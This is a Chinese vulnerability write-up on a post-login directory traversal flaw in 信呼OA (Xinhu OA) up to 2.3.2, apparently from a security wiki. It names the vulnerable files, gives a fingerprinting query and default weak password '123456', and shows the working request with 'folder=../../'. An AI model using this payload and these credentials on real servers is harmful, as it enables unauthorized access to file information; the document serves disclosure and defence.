# 信呼OA beifenAction.php 后台目录遍历漏洞

## 漏洞描述

信呼OA beifenAction.php文件中调用了 getfilerows方法，导致了目录遍历漏洞，攻击者通过漏洞可以获取服务器上的文件信息

## 漏洞影响

<a-checkbox checked>信呼OA <= 2.3.2</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="信呼协同办公系统"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1637826393127-40e04bac-5443-4dd6-b5d4-b2e8e7e63606.png)

其中默认存在几个用户存在弱口令 123456

![img](../../../.vuepress/public/img/1637826384345-ad90b308-7431-4a96-9baa-6808129967ea.png)

存在漏洞的文件为 `webmain/system/beifen/beifenAction.php`

![img](../../../.vuepress/public/img/1637826483632-dc07740e-e0e5-4b6e-8ce3-e24ad1398db9.png)

查看 `getfilerows()` 方法，在 `include/chajian/fileChajian.php`  

![img](../../../.vuepress/public/img/1637826756244-21762aa4-adbe-453a-86e3-452e767df30e.png)

该方法遍历目录下的文件名并输出，登录后，发送请求包

```python
POST /index.php?a=getdatssss&m=beifen&d=system&ajaxbool=true

folder=../../
```

![img](../../../.vuepress/public/img/1637826832637-432df24d-758c-41c0-885e-ba6f79354ce4.png)